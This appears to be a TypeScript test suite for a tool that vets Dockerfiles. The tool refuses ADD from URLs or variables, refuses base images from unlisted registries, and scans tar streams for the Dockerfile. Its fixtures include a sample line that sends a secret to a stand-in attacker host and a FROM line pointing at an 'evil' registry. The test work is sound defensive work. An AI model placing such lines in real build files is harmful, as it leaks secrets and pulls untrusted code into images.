import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { DockerfileTap, dockerfileLines, vetDockerfile } from './dockerfile.js';
import { tarFiles } from './tar.js';

describe('vetDockerfile', () => {
  it('passes an ordinary Dockerfile', () => {
    expect(
      vetDockerfile(
        [
          'FROM node:22-bookworm-slim AS deps',
          'COPY package*.json ./',
          'RUN npm ci',
          'FROM ghcr.io/acme/base:1 AS run',
          'COPY --from=deps /app/node_modules ./node_modules',
          'ADD --chown=node app.tar.gz /app/',
          'CMD ["node", "index.js"]',
        ].join('\n'),
      ),
    ).toEqual([]);
  });

  it('refuses ADD from a URL or a variable, in every spelling', () => {
    for (const text of [
      'FROM node:22\nADD https://attacker.example/?d=secret /x',
      'FROM node:22\nadd --checksum=sha256:00 http://a.example/f /f',
      'FROM node:22\nADD ["https://a.example/f", "/f"]',
      'FROM node:22\nADD git@github.com:acme/x.git /x',
      'FROM node:22\nADD \\\n  https://a.example/f \\\n  /f',
      '# escape=`\nFROM node:22\nADD `\n  https://a.example/f /f',
      'FROM node:22\nONBUILD ADD https://a.example/f /f',
    ]) {
      expect(vetDockerfile(text).join(' '), text).toMatch(/URL/);
    }
    expect(vetDockerfile('FROM node:22\nARG U=https://a.example/f\nADD $U /f').join(' ')).toMatch(/variable/);
  });

  it('refuses FROM and COPY --from of an unlisted registry; stages and variables pass', () => {
    expect(vetDockerfile('FROM evil.example.com/x:1').join(' ')).toMatch(/evil\.example\.com/);
    expect(vetDockerfile('FROM node:22\nCOPY --from=evil.example.com/x /a /b').join(' ')).toMatch(/COPY --from/);
    expect(vetDockerfile('FROM localhost:5000/x').join(' ')).toMatch(/localhost:5000/);
    expect(vetDockerfile('FROM node:22 AS build\nFROM build\nCOPY --from=build /a /b\nCOPY --from=0 /a /b')).toEqual([]);
    expect(vetDockerfile('ARG BASE=node:22\nFROM $BASE')).toEqual([]);
  });

  it('joins continuations and drops comments', () => {
    expect(dockerfileLines('RUN a \\\n  # note\n  b\n\n# c\nCMD x')).toEqual(['RUN a b', 'CMD x']);
  });
});

describe('DockerfileTap', () => {
  const feed = (tap: DockerfileTap, buf: Buffer, step = 97): void => {
    for (let i = 0; i < buf.length; i += step) tap.write(buf.subarray(i, i + step));
  };

  it('finds the Dockerfile in a stream fed in odd-sized pieces', () => {
    const tar = tarFiles([
      { path: '/src/index.js', content: 'x'.repeat(1500) },
      { path: '/Dockerfile', content: 'FROM node:22\nADD https://a.example/f /f\n' },
    ]);
    const tap = new DockerfileTap('Dockerfile');
    feed(tap, tar);
    expect(tap.result().join(' ')).toMatch(/URL/);
    const ok = new DockerfileTap('Dockerfile');
    feed(ok, tarFiles([{ path: '/Dockerfile', content: 'FROM node:22\nRUN true\n' }]));
    expect(ok.result()).toEqual([]);
  });

  it('fails closed when the Dockerfile is missing', () => {
    const tap = new DockerfileTap('docker/Dockerfile');
    feed(tap, tarFiles([{ path: '/Dockerfile', content: 'FROM node:22\n' }]));
    expect(tap.result().join(' ')).toMatch(/no Dockerfile/);
  });

  it('checks the lower-case fallback name too', () => {
    const tap = new DockerfileTap('Dockerfile');
    feed(tap, tarFiles([{ path: '/dockerfile', content: 'FROM node:22\nADD http://a.example/f /f\n' }]));
    expect(tap.result().join(' ')).toMatch(/URL/);
  });

  describe('with the system tar', () => {
    let dir: string;
    afterEach(() => rmSync(dir, { recursive: true, force: true }));
    const tarOf = (d: string): Buffer => execFileSync('tar', ['-c', '-f', '-', '-C', d, '.'], { env: { ...process.env, COPYFILE_DISABLE: '1' } });

    it('reads a long path and refuses a linked Dockerfile', () => {
      dir = mkdtempSync(join(tmpdir(), 'dockerfile-tap-'));
      const deep = join(dir, 'a'.repeat(60), 'b'.repeat(60));
      mkdirSync(deep, { recursive: true });
      writeFileSync(join(deep, 'Dockerfile'), 'FROM node:22\nADD https://a.example/f /f\n');
      const rel = `${'a'.repeat(60)}/${'b'.repeat(60)}/Dockerfile`;
      const tap = new DockerfileTap(rel);
      feed(tap, tarOf(dir), 4096);
      expect(tap.result().join(' ')).toMatch(/URL/);

      writeFileSync(join(dir, 'real.Dockerfile'), 'FROM node:22\n');
      symlinkSync('real.Dockerfile', join(dir, 'Dockerfile'));
      const linked = new DockerfileTap('Dockerfile');
      feed(linked, tarOf(dir), 4096);
      expect(linked.result().join(' ')).toMatch(/link/);
    });
  });
});
